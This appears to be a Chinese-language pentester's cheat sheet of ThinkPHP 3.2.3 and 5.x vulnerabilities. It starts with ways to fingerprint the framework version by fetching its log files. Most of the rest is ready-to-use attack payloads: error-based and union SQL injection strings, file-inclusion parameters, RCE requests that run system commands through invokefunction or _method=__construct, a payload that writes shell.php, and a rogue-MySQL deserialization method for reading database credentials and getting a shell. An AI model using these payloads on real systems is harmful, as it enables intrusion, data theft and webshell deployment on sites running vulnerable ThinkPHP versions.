# ThinkPHP总结

介绍：这是一篇tp的漏洞总结，以及一些自己遇到过或思考过的tricks，

查找漏洞建议直接页面搜索版本号，例如这些关键字：5.1、5.0、3.2

---

问题：如何判断TP版本？

-   黑盒
    -   构造请求错误，如果目标错误管理不规范就可能显示tp版本信息
    -   请求`App/Runtime/Logs/Home/22_05_12.log`当天日志（tp3）
    -   请求`runtime/log/202205/12.log`当天日志（tp5）
-   白盒
    -   全局搜索`THINK_VERSION`（tp3），或者`VERSION`（tp5）
    -   看控制器方法的写法：类似M(xxxx)这种用一个大写字母来实例化（tp3）
-   开源的系统可以尝试去该系统的官网or站长下载这类源码站看系统介绍

## thinkphp5

### 注入类

```php
不开启debug和trace，只开启show_error_msg显示错误信息也可尝试利用报错注入
利用条件：需要有注入的tp版本，或者是二开代码中有可控输入+直接拼接。
# 判断开启show_error_msg是否开启？
1. 请求一个不存在的控制器或方法，如/user/userabc/index.html
2. 关闭时只会提示：页面错误！请稍后再试～
	开启时会提示：控制器不存在:app\user\controller\Userabc
# 实际案例：kyxscms（基于TP5.1.33，虽然开启了show_error_msg但是没有利用条件，本人在某次项目中看到有基于kyxscms二开的一个系统符合“二开代码中有可控输入+直接拼接”这个条件。）
```

```php
# 摘自吐司https://www.t00ls.com/viewthread.php?tid=65613
# 5.0.5左右的低版本
id=input("id");
data=db("users")->where("id",$id)->find();
```

```php
# 版本：5.0.13<=ThinkPHP<=5.0.15、 5.1.0<=ThinkPHP<=5.1.5
payload：/public/index.php/index/index？username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
# 代码：
$username = request()->get('username/a');
db('users')->insert(['username' => $username]);
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之SQLI审计分析(一).md
```

```php
# 版本：ThinkPHP=5.0.10
payload：/public/index.php/index/index?username[0]=not like&username[1][0]=&username[1][1]=&username[2]=) union select 1,user()--+
# 代码：
$username = request()->get('username/a');
$result = db('users')->where(['username' => $username])->select();
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之SQLI审计分析(二).md
```

```php
# 版本：ThinkPHP=5.1.22
payload：/public/index.php/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1
# 代码：
$orderby = request()->get('orderby');
$result = db('users')->where(['username' => 'mochazz'])->order($orderby)->find();
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之SQLI审计分析(三).md
```

```php
# 不同版本 payload 需稍作调整：
5.0.0~5.0.21 、 5.1.3～5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
5.1.11～5.1.25 ： id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
# 代码：
$options = request()->get('options');
$result = db('users')->max($options);
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之SQLI审计分析(四).md
```

```php
# 注意有没有直接拼接
	$id=$this->request->param('id'); # 这里是直接用request->param，默认也没有过滤器。
	$result = Db::table('users')->where("id=". $id)->find(); # 没有以数组形式传入where导致注入，
```

### getshell类

RCE的洞，黑盒测试的话直接上工具就行吧。

```php
# 文件包含
# 版本：5.0.0<=ThinkPHP5<=5.0.18 、5.1.0<=ThinkPHP<=5.1.10
payload：/index/index?cacheFile=1.jpg即可包含1.jpg
# 代码：
$this->assign(request()->get());
return $this->fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
return $this->display(); //display方法也可以触发漏洞
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之文件包含审计分析(五).md
```

```php
# 代码执行
# 不同版本 payload 需稍作调整：
# ThinkPHP <= 5.0.13：
POST /?s=index/index
s=whoami&_method=__construct&method=&filter[]=system

# ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
POST /
_method=__construct&filter[]=system&server[REQUEST_METHOD]=ls -al

# ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
POST /?s=captcha HTTP/1.1
_method=__construct&filter[]=system&method=get&get[]=ls+-al
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls

# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5之任意方法调用RCE(六).md
```

```php
# 代码执行
# 不同版本 payload 需稍作调整：
5.1.x ：
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

5.0.x ：
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
# 分析：https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP5漏洞分析之代码执行(七).md
```

[5.0.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md)

[5.1.X 反序列化链子](https://github.com/lu2ker/PHP-Code/blob/main/TP5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md)

[5.2.X反序列化利用链](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md)

[链子集合](https://github.com/ambionics/phpggc/tree/master/gadgetchains/ThinkPHP)

推荐阅读：

[挖掘暗藏ThinkPHP中的反序列利用链](https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/)

## thinkphp3.2.3

### 注入类

```php
# exp注入
$id = $_GET['id'];
$Admin = D("admin");
$data = $Admin->where(['Id' => $id])->limit('2')->select();

# payload：?id[0]=exp&id[1]==1 UNION ALL SELECT 1,2,3
# 两个等号，没错。具体分析看这里
# https://github.com/lu2ker/PHP-Code/blob/main/ThinkPHP3之SQLI审计分析.md
```

```php
# order by注入
$username=I("username");
$order=I("order");
$result= M('users')->where(array("username"=>$username))->order($order)->find();

# payload：username=admin&order[extractvalue(1,concat(0x7e,(select+database())))]
# 分析&实际案例：https://althims.com/2020/02/03/xyhcms-3-6/#xyhcms-v3-6-前台sql注入
```

下面这些摘自土司@[H0ward](https://www.t00ls.com/viewthread.php?tid=65613)

```php
# 框架级漏洞
$id=I('post.id');
$list = M('system_skin')->find($id);//select() delect()都会有问题
# payload:
id[where]=1’and
id[alias]=where 1 and
id[table]=users where 1 and

# save注入
$comdition["username"]=I("username");
$data["password"]=I("password");
$list = M('admin_user')->where($comdition)->save($data);
# payload:
username[0]=bind&username[1]=0+and(select+extractvalue(1,concat(0x7e,(select+database()))))&password=123   
```

```php
# 其余要注意的点
# 注意在对象创建的时候有没有用过滤器，没有的话输入就可控了。
	$id = I('id', 0, 'intval'); # 这是用了整数过滤器获取参数id
```

[开发中容易造成漏洞的写法](https://blog.csdn.net/Fly_hps/article/details/84954830)

### getshell类

-   [反序列化POC](https://github.com/lu2ker/PHP-Code/blob/main/thinkphp3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POC.php)，利用方式为：

    -   用`rogue_mysql_server`开启一个恶意Mysql服务器，在配置文件中填入想要读取的文件，比如读取目标数据库配置文件拿到数据库账户密码;
    -   POC里修改数据库配置为你的恶意mysql；
    -   发送序列化payload，恶意MySQL服务器可以读取到目标数据库配置文件内容；
    -   将POC中的数据库连接配置替换为目标的数据库配置，可修改需要注入的SQL语句，
    -   因为`ThinkPHP v3.2.*`默认使用的是PDO驱动来实现的数据库类，因为PDO默认是支持多语句查询的，所以这个点是可以堆叠注入的。也就是说这里可以使用导出数据库日志等手段实现Getshell，或者使用`UPDATE`语句插入数据进数据库内等操作。

    条件：目标数据库账户必须是root

    实际案例：[XYHCMS前台反序列化](https://github.com/M00nBack/vulnerability/tree/main/xyhcms/XYHCMS%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
